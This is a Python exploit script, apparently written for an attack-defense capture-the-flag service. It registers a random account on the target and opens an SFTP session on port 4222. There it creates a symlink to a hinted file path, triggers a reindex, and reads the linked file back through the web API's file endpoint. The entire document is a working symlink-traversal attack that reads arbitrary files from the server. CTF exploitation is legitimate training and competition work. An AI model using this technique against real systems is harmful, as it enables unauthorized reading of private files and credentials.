import sys

import checklib
import paramiko

IP = sys.argv[1]
HINT = sys.argv[2]

URL = 'http://{}:8080'.format(IP)


def register(username: str, password: str):
    sess = checklib.get_initialized_session()
    resp = sess.post(URL + '/register', json={'username': username, 'password': password})
    assert resp.status_code == 200
    return sess


def login(username: str, password: str):
    sess = checklib.get_initialized_session()
    resp = sess.post(URL + '/login', json={'username': username, 'password': password})
    assert resp.status_code == 200
    return sess


def reindex(sess):
    resp = sess.post(URL + '/reindex')
    assert resp.status_code == 200


def read_hack_file(sess, fname):
    resp = sess.get(URL + '/files')
    for x in resp.json():
        if fname in x['path']:
            resp = sess.get(URL + '/file', params={'path': x['path'], 'token': x['token']})
            print(resp.text, flush=True)
            break


u = checklib.rnd_username(5)
p = checklib.rnd_password(10)
register(u, p)
s = login(u, p)

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
cli.connect(IP, port=4222, username=u, password=p)
sftp_cli = cli.open_sftp()

hack_file_name = checklib.rnd_string(4) + '.txt'
sftp_cli.symlink(HINT, hack_file_name)

reindex(s)
read_hack_file(s, hack_file_name)
